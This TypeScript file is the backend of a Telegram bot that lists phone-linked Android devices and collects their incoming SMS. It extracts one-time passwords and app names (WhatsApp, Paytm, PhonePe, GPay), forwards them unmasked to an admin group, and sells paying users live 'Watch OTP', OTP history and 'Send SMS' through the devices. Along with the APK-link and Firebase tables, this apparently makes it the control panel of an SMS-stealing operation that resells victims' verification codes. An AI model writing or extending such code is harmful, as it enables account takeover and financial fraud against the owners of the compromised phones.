import TelegramBot, {
  type EditMessageTextParams,
  type InlineKeyboardButton,
  type InlineKeyboardMarkup,
  type Message,
  type SendMessageParams,
} from "node-telegram-bot-api";
import { eq, desc, count, max, and, sum, lt, gt, gte, isNull, isNotNull, sql } from "drizzle-orm";
import {
  db,
  devicesTable, panelsTable, messagesTable, firebaseConfigsTable,
  accessKeysTable, userAccessTable, referralsTable, forceChannelsTable,
  apkLinksTable, botLinksTable, qrItemsTable,
  webPanelsTable,
  walletsTable, paymentRequestsTable, keyPlansTable, botSettingsTable,
  type Device,
} from "@workspace/db";
import qrcode from "qrcode";
import { logger } from "../lib/logger.js";
import { normalizePhoneNumber, phoneNumberKey, isValidPhoneNumber as isValidPhoneNumberShared } from "../lib/phone.js";
import { randomBytes } from "node:crypto";

type SendMessageOptions = Omit<SendMessageParams, "chat_id" | "text" | "reply_markup"> & {
  reply_markup?: InlineKeyboardMarkup;
};
type EditMessageTextOptions = Omit<EditMessageTextParams, "chat_id" | "message_id" | "inline_message_id" | "text">;

// ─── IN-PROCESS STATE ─────────────────────────────────────────────────────────
let bot: TelegramBot | null = null;
const deviceWatchers = new Map<number, Set<string>>();
const pendingInputs = new Map<string, { type: string; data?: Record<string, unknown> }>();
const activeNumbersMsgs = new Map<string, { messageId: number; page: number }>();
const redemptionLocks = new Set<string>();

// ─── USER ACCESS CACHE (60-second TTL for speed) ──────────────────────────────
interface AccessEntry { hasAccess: boolean; expiresAt: Date | null; fetchedAt: number }
const accessCache = new Map<string, AccessEntry>();
const ACCESS_CACHE_TTL = 60_000;

// ─── SETTINGS CACHE (30-second TTL — avoids per-call DB hits) ─────────────────
const settingsCache = new Map<string, { value: string | null; fetchedAt: number }>();
const SETTINGS_CACHE_TTL = 30_000;

async function getUserAccess(chatId: string): Promise<AccessEntry> {
  const cached = accessCache.get(chatId);
  if (cached && Date.now() - cached.fetchedAt < ACCESS_CACHE_TTL) return cached;
  const [[ua], pausedVal] = await Promise.all([
    db.select().from(userAccessTable).where(eq(userAccessTable.chatId, chatId)),
    getSetting(`access_paused_${chatId}`),
  ]);
  const hasAccess = pausedVal !== "1" && !!ua && ua.expiresAt > new Date();
  const entry: AccessEntry = { hasAccess, expiresAt: ua?.expiresAt ?? null, fetchedAt: Date.now() };
  accessCache.set(chatId, entry);
  return entry;
}

function invalidateAccess(chatId: string) {
  accessCache.delete(chatId);
  settingsCache.delete(`access_paused_${chatId}`);
}

// ─── USER ACTIVITY (stored in the existing settings key/value table) ──────────
interface UserMeta { firstSeen: number; lastSeen: number }
const activityCache = new Map<string, number>();
const ACTIVITY_WRITE_INTERVAL = 60_000;

async function touchUser(chatId: string): Promise<void> {
  const now = Date.now();
  const lastWrite = activityCache.get(chatId);
  if (lastWrite && now - lastWrite < ACTIVITY_WRITE_INTERVAL) return;
  const existing = await getSetting(`user_meta_${chatId}`);
  let parsed: Partial<UserMeta> = {};
  try { parsed = existing ? JSON.parse(existing) as Partial<UserMeta> : {}; } catch {}
  const meta: UserMeta = {
    firstSeen: typeof parsed.firstSeen === "number" ? parsed.firstSeen : now,
    lastSeen: now,
  };
  await Promise.all([
    setSetting(`user_meta_${chatId}`, JSON.stringify(meta)),
    db.insert(walletsTable).values({ chatId, balance: 0 }).onConflictDoNothing(),
  ]);
  activityCache.set(chatId, now);
}

async function getUserStats(): Promise<{
  totalUsers: number;
  onlineUsers: number;
  activeUsers: number;
  activeKeyUsers: number;
}> {
  const now = Date.now();
  const [userRows, [walletCount], [keyCount]] = await Promise.all([
    db.select({ key: botSettingsTable.key, value: botSettingsTable.value })
      .from(botSettingsTable)
      .where(and(
        gt(botSettingsTable.key, "user_meta_"),
        lt(botSettingsTable.key, "user_meta_~"),
      )),
    db.select({ count: count() }).from(walletsTable),
    db.select({ count: count() }).from(userAccessTable).where(gt(userAccessTable.expiresAt, new Date())),
  ]);
  let totalUsers = 0;
  let onlineUsers = 0;
  let activeUsers = 0;
  for (const row of userRows ?? []) {
    try {
      const meta = JSON.parse(row.value) as Partial<UserMeta>;
      if (typeof meta.lastSeen !== "number") continue;
      totalUsers++;
      if (now - meta.lastSeen <= 5 * 60_000) onlineUsers++;
      if (now - meta.lastSeen <= 24 * 60 * 60_000) activeUsers++;
    } catch {}
  }
  totalUsers = Math.max(totalUsers, Number(walletCount?.count ?? 0));
  return {
    totalUsers,
    onlineUsers,
    activeUsers,
    activeKeyUsers: Number(keyCount?.count ?? 0),
  };
}

// ─── BAN CHECK ────────────────────────────────────────────────────────────────
async function isBanned(chatId: string): Promise<boolean> {
  const val = await getSetting(`ban_${chatId}`);
  return val === "1";
}

// ─── WALLET HELPERS ───────────────────────────────────────────────────────────
async function getBalance(chatId: string): Promise<number> {
  const [w] = await db.select().from(walletsTable).where(eq(walletsTable.chatId, chatId));
  return w?.balance ?? 0;
}

async function getCreditCoins(chatId: string): Promise<number> {
  const val = await getSetting(`coins_${chatId}`);
  return val ? parseInt(val) || 0 : 0;
}

async function setCreditCoins(chatId: string, amount: number): Promise<void> {
  await setSetting(`coins_${chatId}`, String(Math.max(0, amount)));
}

async function creditWallet(chatId: string, amount: number): Promise<number> {
  const [existing] = await db.select().from(walletsTable).where(eq(walletsTable.chatId, chatId));
  const newBal = (existing?.balance ?? 0) + amount;
  await db
    .insert(walletsTable)
    .values({ chatId, balance: newBal })
    .onConflictDoUpdate({ target: walletsTable.chatId, set: { balance: newBal, updatedAt: new Date() } });
  return newBal;
}

async function debitWallet(chatId: string, amount: number): Promise<{ ok: boolean; balance: number }> {
  await db.insert(walletsTable).values({ chatId, balance: 0 }).onConflictDoNothing();
  const [updated] = await db.update(walletsTable)
    .set({ balance: sql`${walletsTable.balance} - ${amount}`, updatedAt: new Date() })
    .where(and(eq(walletsTable.chatId, chatId), gte(walletsTable.balance, amount)))
    .returning({ balance: walletsTable.balance });
  return updated
    ? { ok: true, balance: updated.balance }
    : { ok: false, balance: await getBalance(chatId) };
}

// ─── BOT SETTINGS HELPERS ─────────────────────────────────────────────────────
async function getSetting(key: string): Promise<string | null> {
  const c = settingsCache.get(key);
  if (c && Date.now() - c.fetchedAt < SETTINGS_CACHE_TTL) return c.value;
  const [row] = await db.select().from(botSettingsTable).where(eq(botSettingsTable.key, key));
  const value = row?.value ?? null;
  settingsCache.set(key, { value, fetchedAt: Date.now() });
  return value;
}

async function setSetting(key: string, value: string): Promise<void> {
  await db
    .insert(botSettingsTable)
    .values({ key, value })
    .onConflictDoUpdate({ target: botSettingsTable.key, set: { value, updatedAt: new Date() } });
  settingsCache.set(key, { value, fetchedAt: Date.now() });
}

async function deleteSetting(key: string): Promise<void> {
  await db.delete(botSettingsTable).where(eq(botSettingsTable.key, key));
  settingsCache.delete(key);
}

async function insertSettingIfMissing(key: string, value: string): Promise<boolean> {
  const [inserted] = await db
    .insert(botSettingsTable)
    .values({ key, value })
    .onConflictDoNothing({ target: botSettingsTable.key })
    .returning({ key: botSettingsTable.key });
  if (inserted) {
    settingsCache.set(key, { value, fetchedAt: Date.now() });
    return true;
  }
  settingsCache.delete(key);
  return false;
}

async function getRegisteredUserIds(): Promise<string[]> {
  const rows = await db.select({ key: botSettingsTable.key })
    .from(botSettingsTable)
    .where(and(
      gt(botSettingsTable.key, "user_meta_"),
      lt(botSettingsTable.key, "user_meta_~"),
    ));
  return rows
    .map((row) => row.key.slice("user_meta_".length))
    .filter((chatId) => /^-?\d+$/.test(chatId));
}

const ACTIVITY_GROUP_SETTING = "activity_group_chat_id";
const ADMIN_GROUP_SETTING = "admin_group_chat_id";
const ACTIVITY_MIN_INTERVAL_MS = 3_000;
interface GroupSendState {
  nextAllowedAt: number;
  sendInFlight: boolean;
  blockedUntil: number;
}
const activitySendState: GroupSendState = { nextAllowedAt: 0, sendInFlight: false, blockedUntil: 0 };
const adminGroupSendState: GroupSendState = { nextAllowedAt: 0, sendInFlight: false, blockedUntil: 0 };

async function getActivityGroupId(): Promise<string | null> {
  const value = await getSetting(ACTIVITY_GROUP_SETTING);
  return value?.trim() || null;
}

async function getAdminGroupId(): Promise<string | null> {
  const value = await getSetting(ADMIN_GROUP_SETTING);
  return value?.trim() || null;
}

async function sendConfiguredGroupNotification(
  settingKey: string,
  text: string,
  state: GroupSendState,
  logLabel: string,
): Promise<boolean> {
  const b = bot;
  const groupId = await getSetting(settingKey);
  if (!b || !groupId) return false;
  const now = Date.now();
  if (state.sendInFlight || now < state.nextAllowedAt || now < state.blockedUntil) return false;
  state.sendInFlight = true;
  try {
    await b.sendMessage(groupId, text, { parse_mode: "Markdown" });
    state.nextAllowedAt = Date.now() + ACTIVITY_MIN_INTERVAL_MS;
    return true;
  } catch (err) {
    const retryAfter = Number((err as { response?: { body?: { parameters?: { retry_after?: number } } } })
      ?.response?.body?.parameters?.retry_after);
    if (Number.isFinite(retryAfter) && retryAfter > 0) {
      state.blockedUntil = Date.now() + (retryAfter + 1) * 1_000;
    }
    logger.warn({ err, groupId }, `${logLabel} group notification failed`);
    return false;
  } finally {
    state.sendInFlight = false;
  }
}

async function sendActivityNotification(text: string): Promise<boolean> {
  return sendConfiguredGroupNotification(ACTIVITY_GROUP_SETTING, text, activitySendState, "OTP activity");
}

async function sendAdminGroupNotification(text: string): Promise<boolean> {
  return sendConfiguredGroupNotification(ADMIN_GROUP_SETTING, text, adminGroupSendState, "Admin");
}

const PRIMARY_ADMIN_ID = "8748066266";
// ─── ADMIN CHAT IDs ───────────────────────────────────────────────────────────
const adminChatIds = new Set<string>();

async function isMaintenanceBlocked(chatId: string, b: TelegramBot): Promise<boolean> {
  if (adminChatIds.has(chatId)) return false;
  if (await getSetting("maintenance") !== "1") return false;
  await b.sendMessage(chatId, "🔧 *Bot maintenance me hai.*\n\nThodi der baad dobara try karo.", { parse_mode: "Markdown" });
  return true;
}

// ─── NUMBERS CACHE (10-min TTL) ───────────────────────────────────────────────
const CACHE_TTL_MS = 10 * 60 * 1000;
const NUMBER_LIST_DATE_SORT_SETTING = "number_list_date_sort";
interface NumbersCache { devices: Device[]; total: number; fetchedAt: number }
let numbersCache: NumbersCache | null = null;

function istDateKey(date: Date): string {
  const ist = new Date(date.getTime() + 5.5 * 60 * 60 * 1000);
  return `${ist.getUTCFullYear()}-${String(ist.getUTCMonth() + 1).padStart(2, "0")}-${String(ist.getUTCDate()).padStart(2, "0")}`;
}

async function fetchOnlineDevices(): Promise<{ devices: Device[]; total: number }> {
  const [devices, messageCounts, dateSortSetting] = await Promise.all([
    db.select().from(devicesTable).orderBy(desc(devicesTable.lastSeen)),
    db.select({
      deviceId: messagesTable.deviceId,
      total: count(),
      lastMessageAt: max(messagesTable.receivedAt),
    })
      .from(messagesTable)
      .groupBy(messagesTable.deviceId),
    getSetting(NUMBER_LIST_DATE_SORT_SETTING),
  ]);

  const messageMetaByDevice = new Map(
    messageCounts.map((row) => [row.deviceId, {
      total: Number(row.total),
      lastMessageAt: row.lastMessageAt?.getTime() ?? 0,
    }])
  );
  const dateSortEnabled = dateSortSetting === "1";
  const todayKey = istDateKey(new Date());
  const recentMessageCutoff = Date.now() - 30_000;

  const valid = (devices as Device[]).filter((device) => {
    const raw = (device.phoneNumber ?? "").trim();
    const digits = raw.replace(/\\D/g, "");

    return (
      device.isListed &&
      digits.length >= 10 &&
      digits.length <= 15 &&
      !/[a-z]/i.test(raw) &&
      (messageMetaByDevice.get(device.id)?.total ?? 0) > 0
    );
  }).sort((a, b) => {
    const aLatest = messageMetaByDevice.get(a.id)?.lastMessageAt ?? 0;
    const bLatest = messageMetaByDevice.get(b.id)?.lastMessageAt ?? 0;
    if (dateSortEnabled) {
      const aToday = aLatest > 0 && istDateKey(new Date(aLatest)) === todayKey;
      const bToday = bLatest > 0 && istDateKey(new Date(bLatest)) === todayKey;
      if (aToday !== bToday) return aToday ? -1 : 1;
      if (aLatest !== bLatest) return bLatest - aLatest;
    } else {
      const aRecent = aLatest >= recentMessageCutoff;
      const bRecent = bLatest >= recentMessageCutoff;
      if (aRecent !== bRecent) return aRecent ? -1 : 1;
      if (aRecent && aLatest !== bLatest) return bLatest - aLatest;
    }

    const messageCountDifference =
      (messageMetaByDevice.get(b.id)?.total ?? 0) -
      (messageMetaByDevice.get(a.id)?.total ?? 0);

    return (
      messageCountDifference ||
      Number(b.isOnline) - Number(a.isOnline) ||
      (b.lastSeen?.getTime() ?? 0) -
      (a.lastSeen?.getTime() ?? 0)
    );
  });

  const unique = new Map<string, Device>();

  for (const device of valid) {
    const digits = (device.phoneNumber ?? "").replace(/\\D/g, "");
    const key = digits.slice(-10);

    if (!unique.has(key)) {
      unique.set(key, device);
    }
  }

  const result = [...unique.values()];
  return {
    devices: result,
    total: result.length,
  };
}
function getCachedOrFetch(forceRefresh = false): Promise<{ devices: Device[]; total: number }> {
  if (!forceRefresh && numbersCache && Date.now() - numbersCache.fetchedAt < CACHE_TTL_MS)
    return Promise.resolve(numbersCache);
  return fetchOnlineDevices().then((r) => { numbersCache = { ...r, fetchedAt: Date.now() }; return r; });
}

export function notifyNumbersChanged(): void { numbersCache = null; }

function randomSubset<T>(items: T[], amount: number): T[] {
  const copy = [...items];
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [copy[i], copy[j]] = [copy[j]!, copy[i]!];
  }
  return copy.slice(0, amount);
}

async function getHiddenNumberIds(): Promise<number[]> {
  return getEligibleNumberIds(false);
}

async function getEligibleNumberIds(listed: boolean): Promise<number[]> {
  const [devices, messageCounts] = await Promise.all([
    db.select().from(devicesTable).where(eq(devicesTable.isListed, listed)),
    db.select({ deviceId: messagesTable.deviceId, total: count() })
      .from(messagesTable)
      .groupBy(messagesTable.deviceId),
  ]);
  const messageTotals = new Map(messageCounts.map((row) => [row.deviceId, Number(row.total)]));
  return devices
    .filter((device) => {
      const digits = (device.phoneNumber ?? "").replace(/\D/g, "");
      return digits.length >= 10 && digits.length <= 15 && !/[a-z]/i.test(device.phoneNumber ?? "")
        && (messageTotals.get(device.id) ?? 0) > 0;
    })
    .map((device) => device.id);
}

async function getListedNumberIds(): Promise<number[]> {
  return getEligibleNumberIds(true);
}

async function refreshNumberVisibility(): Promise<void> {
  notifyNumbersChanged();
  await refreshActiveNumbersMessages();
}

async function refreshActiveNumbersMessages(): Promise<void> {
  const b = bot;
  if (!b || activeNumbersMsgs.size === 0) return;
  try {
    const r = await fetchOnlineDevices();
    numbersCache = { ...r, fetchedAt: Date.now() };
  } catch {
    return;
  }
  for (const [chatId, info] of activeNumbersMsgs.entries()) {
    try {
      const { text, opts } = buildNumbersListFromCache(info.page);
      await b.editMessageText(text, { chat_id: chatId, message_id: info.messageId, ...opts }).catch(() => {});
    } catch {
      activeNumbersMsgs.delete(chatId);
    }
  }
}

function startAutoRefresh(): void {
  setInterval(async () => {
    await refreshActiveNumbersMessages();
  }, CACHE_TTL_MS);
}

// ─── FORMATTERS ───────────────────────────────────────────────────────────────
function formatDate(d: Date | null | undefined): string {
  if (!d) return "N/A";
  const ist = new Date(d.getTime() + 5.5 * 60 * 60 * 1000);
  const dd = String(ist.getUTCDate()).padStart(2, "0");
  const mm = String(ist.getUTCMonth() + 1).padStart(2, "0");
  const yr = ist.getUTCFullYear();
  let hr = ist.getUTCHours();
  const min = String(ist.getUTCMinutes()).padStart(2, "0");
  const ap = hr >= 12 ? "pm" : "am"; hr = hr % 12 || 12;
  return `${dd}/${mm}/${yr}, ${String(hr).padStart(2, "0")}:${min} ${ap}`;
}

function batteryStr(b: number | null | undefined): string {
  if (!b) return "❓";
  return b >= 60 ? `🟢 ${b}%` : b >= 30 ? `🟡 ${b}%` : `🔴 ${b}%`;
}

function shortPhone(device: Device): string {
  if (!device.phoneNumber) return "Unknown";
  const ph = normalizePhoneNumber(device.phoneNumber) || device.phoneNumber;
  return ph.length > 10 ? ph.slice(-10) : ph;
}

function escapeMarkdown(value: string | number | null | undefined): string {
  return String(value ?? "—").replace(/([_*[\]()`\\])/g, "\\$1");
}

function normalizeHttpUrl(value: string): string | null {
  try {
    const url = new URL(value.trim());
    return url.protocol === "http:" || url.protocol === "https:" ? url.toString() : null;
  } catch {
    return null;
  }
}

function maskPhoneForActivity(value: string | null | undefined): string {
  if (!value) return "Unknown";
  const raw = value.trim();
  const compact = raw.replace(/[\s().-]/g, "");
  if (!/^\+?\d+$/.test(compact)) return value;
  const digits = compact.replace(/^\+/, "");
  if (digits.length < 10) return value;
  const prefix = digits.length > 10 ? digits.slice(0, -10) : "";
  const local = digits.slice(-10);
  return `${prefix}${local.slice(0, 8)}**${local.slice(8)}`;
}

function maskPhoneForGroup(value: string | null | undefined): string {
  const raw = String(value ?? "").trim();
  const digits = raw.replace(/\D/g, "");
  if (digits.length < 10) return raw || "Unknown";
  const prefixDigits = digits.slice(0, -10);
  const local = digits.slice(-10);
  const prefix = prefixDigits ? `${raw.startsWith("+") ? "+" : ""}${prefixDigits}` : "";
  return `${prefix}${local.slice(0, 8)}**`;
}

const KNOWN_APP_NAMES = [
  "WhatsApp", "Facebook", "Instagram", "Telegram", "Google", "Gmail", "Microsoft",
  "Amazon", "Flipkart", "Paytm", "PhonePe", "GPay", "Google Pay", "Netflix",
  "Snapchat", "Twitter", "X", "Uber", "Ola", "Swiggy", "Zomato", "UPI",
];

function extractAppName(body: string, from: string | null | undefined): string {
  const known = KNOWN_APP_NAMES.find((name) => new RegExp(`\\b${name.replace(" ", "\\s+")}\\b`, "i").test(body));
  if (known) return known;
  const context = body.match(/\b(?:for|from|on|at)\s+([A-Za-z][A-Za-z0-9 ._-]{2,24})/i)?.[1]
    ?.replace(/\s+(?:is|your|otp|code|:).*$/i, "")
    .trim();
  if (context) return context;
  return from && /[A-Za-z]/.test(from) ? from.trim() : "";
}

function extractOtp(body: string): string {
  const matches = body.match(/\b(?:\d{4}|\d{6}|\d{8})\b/g);
  return matches?.at(-1) ?? "Not detected";
}

function maskOtp(otp: string): string {
  if (!/^\d{4,8}$/.test(otp)) return otp;
  const visible = Math.ceil(otp.length / 2);
  return `${otp.slice(0, visible)}${"*".repeat(otp.length - visible)}`;
}

function formatGroupReceivedTime(date: Date): string {
  return formatDate(date).replace(", ", " ");
}

function formatGroupOtpNotification(params: {
  number: string;
  body: string;
  from: string | null | undefined;
  timestamp: Date;
}): string {
  return (
    `🚨 *New OTP Recived*\n\n` +
    `☎️ *Number:* \`${escapeMarkdown(maskPhoneForGroup(params.number))}\`\n` +
    `🔑 *OTP:* \`${escapeMarkdown(maskOtp(extractOtp(params.body)))}\`\n` +
    `📱 *App:* ${escapeMarkdown(extractAppName(params.body, params.from))}\n` +
    `🕐 *Received Time:* ${escapeMarkdown(formatGroupReceivedTime(params.timestamp))}\n` +
    `📡 *Status:* 🟢`
  );
}

function formatAdminGroupOtpNotification(params: {
  number: string;
  body: string;
  from: string | null | undefined;
  timestamp: Date;
}): string {
  return (
    `🚨 *New OTP Recived*\n\n` +
    `☎️ *Number:* \`${escapeMarkdown(params.number || "Unknown")}\`\n` +
    `🔑 *OTP:* \`${escapeMarkdown(extractOtp(params.body))}\`\n` +
    `📱 *App:* ${escapeMarkdown(extractAppName(params.body, params.from))}\n` +
    `🕐 *Received Time:* ${escapeMarkdown(formatGroupReceivedTime(params.timestamp))}\n` +
    `📡 *Status:* 🟢`
  );
}

function formatAdminDeviceNotification(event: DeviceActivityEvent, device: Device): string {
  const number = device.phoneNumber || device.simNumber || "Unknown";
  const eventText = event === "new"
    ? "🆕 *New Number Added*"
    : event === "online"
      ? "🟢 *Number Online*"
      : "🔴 *Number Offline*";
  const status = event === "offline" ? "🔴 Offline" : "🟢 Online";
  return (
    `${eventText}\n\n` +
    `☎️ *Number:* \`${escapeMarkdown(number)}\`\n` +
    `📱 *Model:* ${escapeMarkdown(device.model)}\n` +
    `🆔 *Device ID:* \`${escapeMarkdown(device.deviceId)}\`\n` +
    `📡 *Status:* ${status}\n` +
    `🕐 *Time:* ${escapeMarkdown(formatGroupReceivedTime(new Date()))}`
  );
}

// ─── PHONE NUMBER VALIDATION ──────────────────────────────────────────────────
function isValidPhoneNumber(ph: string | null | undefined): boolean {
  if (!ph) return false;
  const norm = ph.trim().toLowerCase();
  if (["yes", "no", "true", "false", "null", "none", "unknown", "n/a", "na"].includes(norm)) return false;
  const compact = ph.trim().replace(/[\s().-]/g, "").replace(/^\+/, "");
  return /^\d{5,15}$/.test(compact);
}

// ─── OFFLINE CHECKER ─────────────────────────────────────────────────────────
export function startOfflineChecker(): void {
  setInterval(async () => {
    try {
      const threshold = new Date(Date.now() - 30 * 60 * 1000);
      const wentOffline = await db.update(devicesTable).set({ isOnline: false })
        .where(and(eq(devicesTable.isOnline, true), lt(devicesTable.lastSeen, threshold)))
        .returning({ id: devicesTable.id });
      for (const device of wentOffline) void notifyDeviceActivity("offline", device.id);
      if (wentOffline.length > 0) notifyNumbersChanged();
    } catch (err) { logger.error({ err }, "Offline checker error"); }
  }, 60_000);
}

// ─── OTP DELIVERY ────────────────────────────────────────────────────────────
export function notifyNewSMS(params: {
  device: Device; from: string; body: string; sim: string; timestamp: Date; messageId: number;
}): Promise<void> {
  const b = bot; if (!b) return Promise.resolve();
  const displayNum = params.sim && params.sim !== params.device.deviceId
    ? params.sim : (params.device.phoneNumber ?? "Unknown");
  const activityText = formatGroupOtpNotification({
    number: displayNum,
    body: params.body,
    from: params.from,
    timestamp: params.timestamp,
  });
  const adminGroupText = formatAdminGroupOtpNotification({
    number: displayNum,
    body: params.body,
    from: params.from,
    timestamp: params.timestamp,
  });
  // Admin group gets the unmasked number and full OTP independently from the
  // user-facing OTP-only activity group.
  void sendAdminGroupNotification(adminGroupText);
  const watchers = deviceWatchers.get(params.device.id);
  if (!watchers || watchers.size === 0) {
    void sendActivityNotification(activityText);
    return Promise.resolve();
  }
  const text =
    `🔔 *Incoming Message*\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `📱 *To:* \`${escapeMarkdown(maskPhoneForActivity(displayNum))}\`\n` +
    `📤 *From:* \`${escapeMarkdown(maskPhoneForActivity(params.from))}\`\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `💬 ${escapeMarkdown(params.body)}\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 ${formatDate(params.timestamp)}`;
  for (const chatId of watchers) {
    // Check if watcher still has valid key access before delivering
    getUserAccess(chatId).then((ua) => {
      if (!ua.hasAccess) {
        deviceWatchers.get(params.device.id)?.delete(chatId);
        return;
      }
      b.sendMessage(chatId, text, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: [[{ text: "🔕 Unwatch", callback_data: `unwatch_${params.device.id}` }]] },
      }).catch(() => {});
    }).catch(() => {});
  }
  // Keep the direct OTP delivery path ahead of lower-priority group activity traffic.
  setTimeout(() => { void sendActivityNotification(activityText); }, 1_000);
  return Promise.resolve();
}

export type DeviceActivityEvent = "online" | "offline" | "new";

export async function notifyDeviceActivity(event: DeviceActivityEvent, deviceId: number): Promise<void> {
  const [device] = await db.select().from(devicesTable).where(eq(devicesTable.id, deviceId));
  if (!device) return;
  await sendAdminGroupNotification(formatAdminDeviceNotification(event, device));
}

export function notifyDeviceUpdate(_id: number): Promise<void> { return Promise.resolve(); }

// ─── NUMBERS LIST ─────────────────────────────────────────────────────────────
function buildNumbersListFromCache(page: number): { text: string; opts: EditMessageTextOptions } {
  const LIMIT = 20;
  const cached = numbersCache;
  const all = cached?.devices ?? [];
  const total = cached?.total ?? 0;
  const offset = page * LIMIT;
  const pageDevs = all.slice(offset, offset + LIMIT);
  const totalPages = Math.max(1, Math.ceil(total / LIMIT));
  const ageMs = cached ? Date.now() - cached.fetchedAt : 0;
  const ageMin = Math.floor(ageMs / 60000);
  const ageSuffix = cached ? (ageMin === 0 ? " _(just updated)_" : ` _(${ageMin}m ago)_`) : "";

  const header = total === 0
    ? `📡 *Online Numbers*\n\n_Koi valid number available nahi hai abhi._`
    : `📡 *Numbers* — ${total} total | Page ${page + 1}/${totalPages}${ageSuffix}`;

  const keyboard: InlineKeyboardButton[][] = [];
  for (let i = 0; i < pageDevs.length; i += 2) {
    const d1 = pageDevs[i]!;
    const row: InlineKeyboardButton[] = [
      { text: `📱 ${shortPhone(d1)} 🟢`, callback_data: `dev_${d1.id}_${page}` },
    ];
    if (pageDevs[i + 1]) {
      const d2 = pageDevs[i + 1]!;
      row.push({ text: `📱 ${shortPhone(d2)} 🟢`, callback_data: `dev_${d2.id}_${page}` });
    }
    keyboard.push(row);
  }
  const nav: InlineKeyboardButton[] = [];
  if (page > 0) nav.push({ text: "◀️ Prev", callback_data: `nums_${page - 1}` });
  nav.push({ text: "🔄 Refresh", callback_data: `nums_${page}` });
  nav.push({ text: "📄 Select Page", callback_data: "nums_page_select" });
  if (offset + LIMIT < total) nav.push({ text: "Next ▶️", callback_data: `nums_${page + 1}` });
  if (nav.length) keyboard.push(nav);
  keyboard.push([{ text: "🔍 Search Number", callback_data: "search_number" }, { text: "🔙 Back", callback_data: "main_menu" }]);
  return { text: header, opts: { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } } };
}

async function sendNumbersList(chatId: string, page: number, messageId?: number, forceRefresh = false): Promise<void> {
  const b = bot; if (!b) return;
  const { total } = await getCachedOrFetch(forceRefresh);
  page = Math.min(Math.max(0, page), Math.max(0, Math.ceil(total / 20) - 1));
  const { text, opts } = buildNumbersListFromCache(page);
  if (messageId) {
    const sent = await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts }).catch(() => null);
    if (sent && typeof sent === "object" && "message_id" in sent)
      activeNumbersMsgs.set(chatId, { messageId: (sent as Message).message_id, page });
    else {
      const nm = await b.sendMessage(chatId, text, opts as SendMessageOptions).catch(() => null);
      if (nm) activeNumbersMsgs.set(chatId, { messageId: nm.message_id, page });
    }
  } else {
    const nm = await b.sendMessage(chatId, text, opts as SendMessageOptions).catch(() => null);
    if (nm) activeNumbersMsgs.set(chatId, { messageId: nm.message_id, page });
  }
}

async function sendPageSelector(chatId: string, messageId?: number): Promise<void> {
  const b = bot; if (!b) return;
  const { total } = await getCachedOrFetch(true);
  const totalPages = Math.max(1, Math.ceil(total / 20));
  const keyboard: InlineKeyboardButton[][] = [];
  for (let page = 0; page < totalPages; page += 4) {
    keyboard.push(Array.from({ length: Math.min(4, totalPages - page) }, (_, offset) => ({
      text: `Page ${page + offset + 1}`,
      callback_data: `nums_${page + offset}`,
    })));
  }
  keyboard.push([{ text: "🔙 Back to Numbers", callback_data: "nums_0" }]);
  const text = `📄 *Select Number List Page*\n\nCurrent total: ${total} valid numbers\nPages available: ${totalPages}`;
  const opts: SendMessageOptions = { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } };
  if (messageId) {
    await b.editMessageText(text, { chat_id: chatId, message_id: messageId, ...opts })
      .catch(() => b.sendMessage(chatId, text, opts));
  } else {
    await b.sendMessage(chatId, text, opts);
  }
}

// ─── DEVICE DETAIL ─────────────────────────────────────────────────────────────
async function sendDeviceDetail(
  chatId: string,
  deviceDbId: number,
  messageId?: number,
  hasKey = false,
  listPage = 0,
): Promise<void> {
  const b = bot; if (!b) return;
  const [device] = await db.select().from(devicesTable).where(eq(devicesTable.id, deviceDbId));
  if (!device) { await b.sendMessage(chatId, "❌ Device not found."); return; }

  const phone = device.phoneNumber ?? "Unknown";
  const lines = [
    `📱 \`${escapeMarkdown(phone)}\``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🔋 Battery  ›  ${batteryStr(device.battery)}`,
    `🤖 Android  ›  ${escapeMarkdown(device.model)}`,
    `📟 SIM      ›  ${escapeMarkdown(device.simNumber)}`,
    `🕐 Last Seen›  ${formatDate(device.lastSeen)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
  ];

  if (hasKey) {
    // Key users can see last 3 OTPs
    const recentMsgs = await db.select().from(messagesTable)
      .where(eq(messagesTable.deviceId, deviceDbId)).orderBy(desc(messagesTable.receivedAt)).limit(3);
    if (recentMsgs.length) {
      lines.push(`🔑 *Last 3 OTPs*`, `────────────────────────────`);
      recentMsgs.forEach((m, i) => {
        lines.push(`  ${i + 1}. ⚡ ${escapeMarkdown(m.body)}`, `     📤 ${escapeMarkdown(m.fromNumber ?? "Unknown")}`, `     🕐 ${formatDate(m.receivedAt)}`);
      });
    } else { lines.push(`\n_No OTP received yet._`); }
  } else {
    lines.push(`\n🔒 _OTP history requires Key access._`);
  }

  const isWatching = deviceWatchers.get(deviceDbId)?.has(chatId) ?? false;
  const keyboard: InlineKeyboardButton[][] = [];

  if (hasKey) {
    keyboard.push([
      isWatching
        ? { text: "🔕 Unwatch", callback_data: `unwatch_${deviceDbId}_${listPage}` }
        : { text: "🔔 Watch OTP", callback_data: `watch_${deviceDbId}_${listPage}` },
      { text: "📤 Send SMS", callback_data: `sendsms_${deviceDbId}_${listPage}` },
    ]);
  } else {
    // Credit user: can open number (deducts coins), cannot watch OTP
    keyboard.push([{ text: "🪙 Use Number (deduct coins)", callback_data: `credit_use_${deviceDbId}_${listPage}` }]);
  }
  keyboard.push([{ text: "🔄 Refresh", callback_data: `dev_${deviceDbId}_${listPage}` }]);
  keyboard.push([{ text: "🔙 Back", callback_data: `nums_${listPage}` }]);

  const opts = { parse_mode: "Markdown" as const, reply_markup: { inline_keyboard: keyboard } };
  if (messageId)
    await b.editMessageText(lines.join("\n"), { chat_id: chatId, message_id: messageId, ...opts }).catch(() => b.sendMessage(chatId, lines.join("\n"), opts));
  else await b.sendMessage(chatId, lines.join("\n"), opts);
}

// ─── FORCE CHANNELS ────────────────────────────────────────────────────────────
async function checkForceChannels(chatId: string): Promise<{ ok: boolean; missing: (typeof forceChannelsTable.$inferSelect)[] }> {
  const b = bot; if (!b) return { ok: true, missing: [] };
